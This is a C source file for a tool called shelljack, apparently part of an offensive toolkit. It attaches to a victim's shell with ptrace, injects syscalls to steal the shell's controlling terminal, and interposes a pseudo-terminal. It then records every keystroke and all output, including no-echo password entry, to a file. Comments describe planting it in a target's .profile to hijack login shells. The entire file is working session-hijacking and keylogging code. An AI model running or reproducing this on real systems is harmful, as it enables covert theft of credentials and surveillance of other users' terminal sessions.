#define _GNU_SOURCE


#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <netdb.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <syscall.h>
#include <termios.h>
#include <unistd.h>

#include <arpa/inet.h>

#include <sys/ioctl.h>
#include <sys/resource.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>

#include "mara.h"
#include "libptrace_do.h"
#include "libctty.h"


#define LOCAL_BUFFER_LEN 64
#define READLINE_BUFFER_LEN	256

#define ATTATCH_DELAY 1


volatile sig_atomic_t sig_found = 0;


void sig_handler(int signal);


void signal_handler(int signal){
	sig_found = signal;
}

int shelljack(int target_pid,char *filename){

	int i, retval;
	int retcode = 0;
	int tmp_fd, fd_max;
	int ptrace_error;
	int original_tty_fd, new_tty_fd;
	int bytes_read;
	int tmp_flag;
	int current_sig;
	//int target_pid;
	int target_fd_count, *target_fds = NULL;
	void *remote_addr;

	char scratch[LOCAL_BUFFER_LEN];
	char *remote_scratch = NULL;
	char char_read;
	char *tmp_ptr;
	char *tty_name;

	struct ptrace_do *target;
	struct termios saved_termios_attrs, new_termios_attrs;
	struct sigaction act, oldact;
	struct winsize argp;

	struct stat tty_info;

	fd_set fd_select;
	pid_t sig_pid;

	struct rlimit fd_limit;



	/*
	 * We're going to mess around with hijacking the tty for a login shell. SIGHUP is a certainty.
	 */
	signal(SIGHUP, SIG_IGN);
	signal(SIGCHLD, SIG_IGN);
	//signal(SIGHUP, SA_NOCLDWAIT);

	/*
	 *	We aren't *really* a daemon, because we will end up with a controlling tty.
	 *	However, we will act daemon-like otherwise. Lets do those daemon-like things now.
	 */

	umask(0);

	if((retval = fork()) == -1){
		perror("fork()");
		exit(-1);
	}

	if(retval){
		int status;
		waitpid(retval, &status, WNOHANG);
		return(0);
	}

	if((int) (retval = setsid()) == -1){
		perror("setsid()");
		exit(-1);
	}

	if((retval = chdir("/")) == -1){
		perror("chdir()");
		exit(-1);
	}

	if((retval = getrlimit(RLIMIT_NOFILE, &fd_limit))){
		perror("getrlimit(RLIMIT_NOFILE");
		exit(-1);
	}


	// Lets close any file descriptors we may have inherited.
	for(i = 0; i < (int) fd_limit.rlim_max; i++){
		if(i != STDERR_FILENO){
			close(i);
		}
	}

	/*************************************************************
	 * Connect to the listener and set up stdout and stderr
	 *************************************************************/
	if((tmp_fd = open(filename, O_WRONLY|O_CREAT, S_IRUSR|S_IWUSR)) == -1){
		perror("Unable to open file: ");
		exit(-1);
	}

	if((retval = close(STDERR_FILENO)) == -1){
		perror("close(STDERR_FILENO)");
		exit(-1);
	}

	if((retval = dup2(tmp_fd, STDERR_FILENO)) == -1){
		perror("dup2");
		exit(-1);
	}

	if((retval = dup2(tmp_fd, STDOUT_FILENO)) == -1){
		perror("dup2");
		exit(-1);
	}


	/*
	 * This helps with a race condition if being launched out of the target's .profile in order
	 * to attack the login shell. Apparently, bash sources the .profile *before* it configures the tty.
	 */
	sleep(ATTATCH_DELAY);


	/**************************************
	 * Open the original tty for our use. *
	 **************************************/
	if((tty_name = ctty_get_name(target_pid)) == NULL){
		TRACE( "[-] ctty_get_name(%d)", target_pid);
	}

	if((target_fd_count = ctty_get_fds(target_pid, tty_name, &target_fds)) == -1){
		TRACE("[-] ctty_get_fds(%d, %s, %lx)", target_pid, tty_name, (unsigned long) &target_fds);
	}

	if((original_tty_fd = open(tty_name, O_RDWR|O_NOCTTY)) == -1){
		TRACE("[-] open(%s, %d)", tty_name, O_RDWR);
	}

	if((retval = fstat(original_tty_fd, &tty_info)) == -1){
		TRACE("[-] fstat(%d, %lx)", original_tty_fd, (unsigned long) &tty_info);
	}

	if((retval = tcgetattr(original_tty_fd, &saved_termios_attrs)) == -1){
		TRACE("[-] tcgetattr(%d, %lx)", original_tty_fd, (unsigned long) &saved_termios_attrs);
	}


	/******************************
	 * Setup our master terminal. *
	 ******************************/

	if((new_tty_fd = posix_openpt(O_RDWR)) == -1){
		TRACE("[-] posix_openpt(%d)", O_RDWR);
	}

	if(grantpt(new_tty_fd)){
		TRACE("[-] grantpt(%d)", new_tty_fd);
	}

	if(unlockpt(new_tty_fd)){
		TRACE("[-] unlockpt(%d)", new_tty_fd);
	}

	if((retval = tcsetattr(new_tty_fd, TCSANOW, &saved_termios_attrs)) == -1){
		TRACE("[-] tcgetattr(%d, %lx)", new_tty_fd, (unsigned long) &saved_termios_attrs);
	}


	/***************************************************************************
	 * Hook into the target process and mangle the target's fds appropriately. *
	 ***************************************************************************/
	ptrace_error = 0;
	if((target = ptrace_do_init(target_pid)) == NULL){
		TRACE("[-] ptrace_do_init(%d)", target_pid);

		ptrace_error = 1;
		goto CLEAN_UP;
	}

	for(i = 0; i < target_fd_count; i++){
		if(!i){

			/*
			 * Quoted from linux/drivers/tty/tty_io.c (kernel source), regarding disassociate_ctty():
			 *  It performs the following functions:
			 *  (1)  Sends a SIGHUP and SIGCONT to the foreground process group
			 *  (2)  Clears the tty from being controlling the session
			 *  (3)  Clears the controlling tty for all processes in the
			 *    session group.
			 */
			ptrace_do_sig_ignore(target, SIGHUP);
			ptrace_do_sig_ignore(target, SIGCONT);

			retval = (int) ptrace_do_syscall(target, __NR_ioctl, target_fds[i], TIOCNOTTY, 0, 0, 0, 0);
			if(errno){
				TRACE("[-] ptrace_do_syscall(%lx, %d, %d, %d, %d, %d, %d, %d)", \
						(unsigned long) target, __NR_ioctl, target_fds[i], TIOCNOTTY, 0, 0, 0, 0);
				ptrace_error = 1;
				goto CLEAN_UP;
			}else if(retval < 0){
				TRACE("[-] remote ioctl(%d, %d)", target_fds[i], TIOCNOTTY);
				ptrace_error = 1;
				goto CLEAN_UP;
			}

			/* Now set original tty as our ctty in the local context. */
			if((retval = ioctl(original_tty_fd, TIOCSCTTY, 1)) == -1){
				TRACE("[-] ioctl(%d, %d, %d)", original_tty_fd, TIOCSCTTY, 1);
				ptrace_error = 1;
				goto CLEAN_UP;
			}
		}

		retval = (int) ptrace_do_syscall(target, __NR_close, target_fds[i], 0, 0, 0, 0, 0);
		if(errno){
			TRACE("[-] ptrace_do_syscall(%lx, %d, %d, %d, %d, %d, %d, %d)", \
					(unsigned long) target, __NR_close, target_fds[i], 0, 0, 0, 0, 0);
			ptrace_error = 1;
			goto CLEAN_UP;
		}else if(retval < 0){
			TRACE("[-] remote close(%d)", target_fds[i]);
			ptrace_error = 1;
			goto CLEAN_UP;
		}
	}

	if((remote_scratch = (char *) ptrace_do_malloc(target, READLINE_BUFFER_LEN)) == NULL){
		TRACE("[-] ptrace_do_malloc(%lx, %d)", \
				(unsigned long) target, READLINE_BUFFER_LEN);
		ptrace_error = 1;
		goto CLEAN_UP;
	}
	memset(remote_scratch, 0, READLINE_BUFFER_LEN);

	if(!(tmp_ptr = ptsname(new_tty_fd))){
		TRACE("[-] ptsname(%d)", new_tty_fd);
		exit(-1);
	}

	// If we are running as root, make sure to chmod the new tty to the match the old one.
	if(!getuid()){
		if((retval = chown(tmp_ptr, tty_info.st_uid, -1)) == -1){
			TRACE("[-] chown(%s, %d, %d)", tmp_ptr, tty_info.st_uid, -1);
			exit(-1);
		}
	}

	memcpy(remote_scratch, tmp_ptr, strlen(tmp_ptr));

	if((remote_addr = ptrace_do_push_mem(target, remote_scratch)) == NULL){
		TRACE("[-] ptrace_do_push_mem(%lx, %lx)", \
				(unsigned long) target, (unsigned long) remote_scratch);
		ptrace_error = 1;
		goto CLEAN_UP;
	}

	retval = (int) ptrace_do_syscall(target, __NR_open, (unsigned long) remote_addr, O_RDWR, 0, 0, 0, 0);
	if(errno){
		TRACE("[-] ptrace_do_syscall(%lx, %d, %lx, %d, %d, %d, %d, %d)", \
				(unsigned long) target, __NR_open, (unsigned long) remote_addr, O_RDWR, 0, 0, 0, 0);
		ptrace_error = 1;
		goto CLEAN_UP;
	}else if(retval < 0){
		TRACE("[-] remote open(%lx, %d)", (unsigned long) remote_addr, O_RDWR);
		ptrace_error = 1;
		goto CLEAN_UP;
	}
	tmp_fd = retval;

	tmp_flag = 0;
	for(i = 0; i < target_fd_count; i++){

		if(target_fds[i] == tmp_fd){
			tmp_flag = 1;
		}else{

			retval = (int) ptrace_do_syscall(target, __NR_dup2, tmp_fd, target_fds[i], 0, 0, 0, 0);
			if(errno){
				TRACE("[-] ptrace_do_syscall(%lx, %d, %d, %d, %d, %d, %d, %d)", \
						(unsigned long) target, __NR_dup2, tmp_fd, target_fds[i], 0, 0, 0, 0);
				ptrace_error = 1;
				goto CLEAN_UP;
			}else if(retval < 0){
				TRACE("[-] remote dup2(%d, %d)", tmp_fd, target_fds[i]);
				ptrace_error = 1;
				goto CLEAN_UP;
			}
		}
	}

	if(!tmp_flag){
		retval = (int) ptrace_do_syscall(target, __NR_close, tmp_fd, 0, 0, 0, 0, 0);
		if(errno){
			TRACE("[-] ptrace_do_syscall(%lx, %d, %d, %d, %d, %d, %d, %d)", \
					(unsigned long) target, __NR_close, tmp_fd, 0, 0, 0, 0, 0);
			ptrace_error = 1;
			goto CLEAN_UP;
		}else if(retval < 0){
			TRACE("[-] remote close(%d)", tmp_fd);
			ptrace_error = 1;
			goto CLEAN_UP;
		}
	}


CLEAN_UP:
	ptrace_do_cleanup(target);

	if(ptrace_error){
		TRACE("[-] Fatal error from ptrace_do. Quitting.");
	}


	/**************************************************
	 * Set the original tty to raw mode.
	 **************************************************/
	memcpy(&new_termios_attrs, &saved_termios_attrs, sizeof(struct termios));

	new_termios_attrs.c_lflag &= ~(ECHO|ICANON|IEXTEN|ISIG);
	new_termios_attrs.c_iflag &= ~(BRKINT|ICRNL|INPCK|ISTRIP|IXON);
	new_termios_attrs.c_cflag &= ~(CSIZE|PARENB);
	new_termios_attrs.c_cflag |= CS8;
	new_termios_attrs.c_oflag &= ~(OPOST);

	new_termios_attrs.c_cc[VMIN] = 1;
	new_termios_attrs.c_cc[VTIME] = 0;

	if((retval = tcsetattr(original_tty_fd, TCSANOW, &new_termios_attrs)) == -1){
		TRACE("[-] tcsetattr(%d, TCSANOW, %lx)", \
				original_tty_fd, (unsigned long) &new_termios_attrs);
		exit(-1);
	}


	/**************************************************
	 * Set the signals for appropriate mitm handling. *
	 **************************************************/

	memset(&act, 0, sizeof(act));
	memset(&oldact, 0, sizeof(oldact));
	act.sa_handler = signal_handler;

	if((retval = sigaction(SIGHUP, &act, &oldact)) == -1){
		fprintf(stderr, "%s: sigaction(%d, %lx, %lx): %s\n", \
				program_invocation_short_name, \
				SIGHUP, (unsigned long) &act, (unsigned long) &oldact, \
				strerror(errno));
		retcode = -errno;
		goto RESET_TERM;
	}
	if((retval = sigaction(SIGINT, &act, NULL)) == -1){
		fprintf(stderr, "%s: sigaction(%d, %lx, %p): %s\n", \
				program_invocation_short_name, \
				SIGINT, (unsigned long) &act, NULL, \
				strerror(errno));
		retcode = -errno;
		goto RESET_TERM;
	}
	if((retval = sigaction(SIGQUIT, &act, NULL)) == -1){
		fprintf(stderr, "%s: sigaction(%d, %lx, %p): %s\n", \
				program_invocation_short_name, \
				SIGQUIT, (unsigned long) &act, NULL, \
				strerror(errno));
		retcode = -errno;
		goto RESET_TERM;
	}
	if((retval = sigaction(SIGTSTP, &act, NULL)) == -1){
		fprintf(stderr, "%s: sigaction(%d, %lx, %p): %s\n", \
				program_invocation_short_name, \
				SIGTSTP, (unsigned long) &act, NULL, \
				strerror(errno));
		retcode = -errno;
		goto RESET_TERM;
	}
	if((retval = sigaction(SIGWINCH, &act, NULL)) == -1){
		fprintf(stderr, "%s: sigaction(%d, %lx, %p: %s)", \
				program_invocation_short_name, \
				SIGWINCH, (unsigned long) &act, NULL, \
				strerror(errno));
		retcode = -errno;
		goto RESET_TERM;
	}

	/*
	 *	The current TIOCGWINSZ for the new terminal will be incorrect at this point.
	 *	Lets force an initial SIGWINCH to ensure it gets set appropriately.
	 */
	if((retval = ioctl(original_tty_fd, TIOCGWINSZ, &argp)) == -1){
		fprintf(stderr, "%s: ioctl(%d, %d, %lx): %s\n", \
				program_invocation_short_name, \
				original_tty_fd, TIOCGWINSZ, (unsigned long) &argp, \
				strerror(errno));
		retcode = -errno;
		goto RESET_TERM;
	}

	if((retval = ioctl(new_tty_fd, TIOCSWINSZ, &argp)) == -1){
		fprintf(stderr, "%s: ioctl(%d, %d, %lx): %s\n", \
				program_invocation_short_name, \
				original_tty_fd, TIOCGWINSZ, (unsigned long) &argp, \
				strerror(errno));
		retcode = -errno;
		goto RESET_TERM;
	}

	if((retval = kill(-target_pid, SIGWINCH)) == -1){
		fprintf(stderr, "%s: kill(%d, %d): %s\n", \
				program_invocation_short_name, \
				-target_pid, SIGWINCH, \
				strerror(errno));
		retcode = -errno;
		goto RESET_TERM;
	}


	/******************************
	 * Mitm the terminal traffic. *
	 ******************************/

	fd_max = (new_tty_fd > original_tty_fd) ? new_tty_fd : original_tty_fd;
	char_read = '\r';

	while(1){
		FD_ZERO(&fd_select);
		FD_SET(new_tty_fd, &fd_select);
		FD_SET(original_tty_fd, &fd_select);

		if(((retval = select(fd_max + 1, &fd_select, NULL, NULL, NULL)) == -1) && !sig_found){
			fprintf(stderr, "%s: select(%d, %lx, %p, %p, %p): %s\n", \
					program_invocation_short_name, \
					fd_max + 1, (unsigned long) &fd_select, NULL, NULL, NULL, \
					strerror(errno));
			retcode = -errno;
			goto RESET_TERM;
		}

		if(sig_found){

			/* Minimize the risk of more signals being delivered while we are already handling signals. */
			current_sig = sig_found;
			sig_found = 0;

			switch(current_sig){

				/*
				 * Signals we want to handle:
				 *	SIGHUP -> Send SIGHUP to the target session, restore our SIGHUP to default, then resend to ourselves.
				 *	SIGINT -> Send SIGINT to the current target foreground job.
				 *	SIGQUIT -> Send SIGQUIT to the current target foreground job.
				 *	SIGTSTP -> Send SIGTSTP to the current target foreground job.
				 *	SIGWINCH -> Grab TIOCGWINSZ from old tty. Set TIOCSWINSZ for new tty. Send SIGWINCH to the current target session.
				 */
				case SIGHUP:

					if((retval = kill(-target_pid, current_sig)) == -1){
						fprintf(stderr, "%s: kill(%d, %d): %s\n", \
								program_invocation_short_name, \
								-target_pid, current_sig, \
								strerror(errno));
						retcode = -errno;
						goto RESET_TERM;
					}

					if((retval = sigaction(current_sig, &oldact, NULL)) == -1){
						fprintf(stderr, "%s: sigaction(%d, %lx, %p): %s\n", \
								program_invocation_short_name, \
								current_sig, (unsigned long) &oldact, NULL, \
								strerror(errno));
						retcode = -errno;
						goto RESET_TERM;
					}

					if((retval = raise(current_sig)) != 0){
						fprintf(stderr, "%s: raise(%d): %s\n", \
								program_invocation_short_name, \
								current_sig, \
								strerror(errno));
						retcode = -errno;
						goto RESET_TERM;
					}
					break;

				case SIGINT:
				case SIGQUIT:
				case SIGTSTP:

					if((sig_pid = tcgetpgrp(new_tty_fd)) == -1){
						fprintf(stderr, "%s: tcgetpgrp(%d): %s\n", \
								program_invocation_short_name, \
								new_tty_fd, \
								strerror(errno));
						retcode = -errno;
						goto RESET_TERM;
					}

					if((retval = kill(-sig_pid, current_sig)) == -1){
						fprintf(stderr, "%s: kill(%d, %d): %s", \
								program_invocation_short_name, \
								sig_pid, current_sig, \
								strerror(errno));
						retcode = -errno;
						goto RESET_TERM;
					}
					break;

				case SIGWINCH:
					if((retval = ioctl(original_tty_fd, TIOCGWINSZ, &argp)) == -1){
						fprintf(stderr, "%s: ioctl(%d, %d, %lx): %s\n", \
								program_invocation_short_name, \
								original_tty_fd, TIOCGWINSZ, (unsigned long) &argp, \
								strerror(errno));
						retcode = -errno;
						goto RESET_TERM;
					}

					if((retval = ioctl(new_tty_fd, TIOCSWINSZ, &argp)) == -1){
						fprintf(stderr, "%s: ioctl(%d, %d, %lx): %s\n", \
								program_invocation_short_name, \
								original_tty_fd, TIOCSWINSZ, (unsigned long) &argp, \
								strerror(errno));
						retcode = -errno;
						goto RESET_TERM;
					}

					if((retval = kill(-target_pid, current_sig)) == -1){
						fprintf(stderr, "%s: kill(%d, %d): %s", \
								program_invocation_short_name, \
								-target_pid, current_sig, \
								strerror(errno));
						retcode = -errno;
						goto RESET_TERM;
					}
					break;

				default:
					fprintf(stderr, "%s: Undefined signal found: %d", \
							program_invocation_short_name, \
							current_sig);
					retcode = -errno;
					goto RESET_TERM;
			}

			current_sig = 0;

			/*
			 * From here on out, we pass chars back and forth, while copying them off
			 * to the remote listener. The "char_read" hack is a cheap way to watch for
			 * a "no echo" situation. (Bash keeps its own state for the tty and lies to
			 * the user about echo on vs echo off. On the back end it's always raw mode.
			 * I suspect this is a natural result of using the GNU readline library.)
			 */
		}else if(FD_ISSET(original_tty_fd, &fd_select)){

			memset(scratch, 0, sizeof(scratch));
			if((retval = read(original_tty_fd, scratch, sizeof(scratch))) == -1){
				fprintf(stderr, "%s: read(%d, %lx, %d): %s\n", \
						program_invocation_short_name, \
						original_tty_fd, (unsigned long) scratch, (int) sizeof(scratch), \
						strerror(errno));
				retcode = -errno;
				goto RESET_TERM;
			}
			bytes_read = (retval == -1) ? 0 : retval;

			if((retval = write(new_tty_fd, scratch, bytes_read)) == -1){
				fprintf(stderr, "%s: write(%d, %lx, %d): %s\n", \
						program_invocation_short_name, \
						new_tty_fd, (unsigned long) scratch, bytes_read, \
						strerror(errno));
				retcode = -errno;
				goto RESET_TERM;
			}

			if(!char_read){
				if(bytes_read == 1){
					char_read = scratch[0];
				}
			}else{
				if(bytes_read == 1){
					if(write(STDOUT_FILENO, &char_read, 1) == -1){
						fprintf(stderr, "%s: write(%d, %lx, %d): %s\n", \
								program_invocation_short_name, \
								STDOUT_FILENO, (unsigned long) &char_read, 1, \
								strerror(errno));
						retcode = -errno;
						goto RESET_TERM;
					}
					char_read = scratch[0];
				}
			}

		}else if(FD_ISSET(new_tty_fd, &fd_select)){

			char_read = '\0';
			memset(scratch, 0, sizeof(scratch));
			errno = 0;
			if(((retval = read(new_tty_fd, scratch, sizeof(scratch))) == -1) && (errno != EIO)){
				fprintf(stderr, "%s: read(%d, %lx, %d): %s\n", \
						program_invocation_short_name, \
						new_tty_fd, (unsigned long) scratch, (int) sizeof(scratch), \
						strerror(errno));
				retcode = -errno;
				goto RESET_TERM;
			}else if(!retval || errno == EIO){
				retcode = 0;
				goto RESET_TERM;
			}
			bytes_read = (retval == -1) ? 0 : retval;

			if((retval = write(original_tty_fd, scratch, bytes_read)) == -1){
				fprintf(stderr, "%s: write(%d, %lx, %d): %s\n", \
						program_invocation_short_name, \
						original_tty_fd, (unsigned long) &char_read, bytes_read, \
						strerror(errno));
				retcode = -errno;
				goto RESET_TERM;
			}

			if(write(STDOUT_FILENO, scratch, bytes_read) == -1){
				fprintf(stderr, "%s: write(%d, %lx, %d): %s\n", \
						program_invocation_short_name, \
						STDOUT_FILENO, (unsigned long) &char_read, 1, \
						strerror(errno));
				retcode = -errno;
				goto RESET_TERM;
			}
		}
	}

RESET_TERM:
	tcsetattr(original_tty_fd, TCSANOW, &saved_termios_attrs);
	kill(0, SIGKILL);
	return(retcode);
}
